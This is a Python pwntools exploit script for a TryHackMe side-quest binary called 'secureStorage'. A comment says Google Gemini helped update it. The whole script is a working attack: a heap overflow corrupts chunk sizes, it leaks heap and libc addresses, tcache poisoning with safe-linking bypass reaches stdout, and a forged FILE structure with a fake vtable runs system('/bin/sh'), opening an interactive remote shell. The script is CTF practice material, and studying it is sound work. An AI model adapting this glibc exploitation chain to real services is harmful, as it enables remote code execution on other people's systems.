#script used on TryHackMe side quest: https://tryhackme.com/r/room/adventofcyber24sidequest 
#T3: Escaping the Blizzard
# this script with assistance from freinds on Discord h00dy
# script also was updated by Google Gemini

from pwn import *

context.update(arch="amd64", os="linux")
context.binary = elf = ELF("./secureStorage", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

r = remote("10.10.251.187", 1337)

def create_entry(index, size, content):
    r.sendlineafter(b'\n>> ', b'1')
    r.sendlineafter(b'Enter permit index:\n', str(index).encode())
    r.sendlineafter(b'Enter entry size:\n', str(size).encode())
    r.sendlineafter(b'Enter entry data:\n', content)

def view_entry(index):
    r.sendlineafter(b'\n>>', b'2')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())

def modify_entry(index, content):
    r.sendlineafter(b'\n>> ', b'3')
    r.sendlineafter(b'Enter entry index:\n', str(index).encode())
    r.sendlineafter(b'Enter data:\n', content)

create_entry(0, 352, b"A")
modify_entry(0, b"A" * 352 + b"C" * 8 + p64(0xc01))
create_entry(1, 0x1000, b"A")
create_entry(2, 64, b"D" * 16)

view_entry(2)
r.recvline()
heap_leak = u64(r.recvline().rstrip().ljust(8, b"\x00")) * 256
heap_base = heap_leak - 0x400

modify_entry(2, b"D" * 80)
view_entry(2)
libc_leak = u64(r.recvline().rstrip()[-6:].ljust(8, b"\x00"))
libc_base = libc_leak - 0x203b20

modify_entry(2, b"D" * 64 + p64(0) + p64(0xb91))

libc.address = libc_base

stdout_lock = libc.address + 0x205710
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps'] - 0x18
gadget = libc.address + 0x0000000000172517

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh'.ljust(8, b'\x00'))
fake._lock = stdout_lock
fake._codecvt = stdout + 0xb8
fake._wide_data = stdout + 0x200
fake.unknown2 = p64(0) * 2 + p64(stdout + 0x20) + p64(0) * 3 + p64(fake_vtable)

payload = bytes(fake)

b_addr = heap_base + 0x43dc0
target = stdout
target_enc = ((target ^ b_addr >> 12))

create_entry(3, 0xd98, b"B" * 0xd98 + p64(0x251))
create_entry(4, 0xda8, b"A" * 0xda8 + p64(0x251))
create_entry(5, 0x1000, b"C")
modify_entry(4, b"D" * 0xda8 + p64(0x231) + p64(target_enc))
create_entry(6, 0x228, b"A")
create_entry(7, 0x228, b"A")
modify_entry(7, payload)

r.interactive()
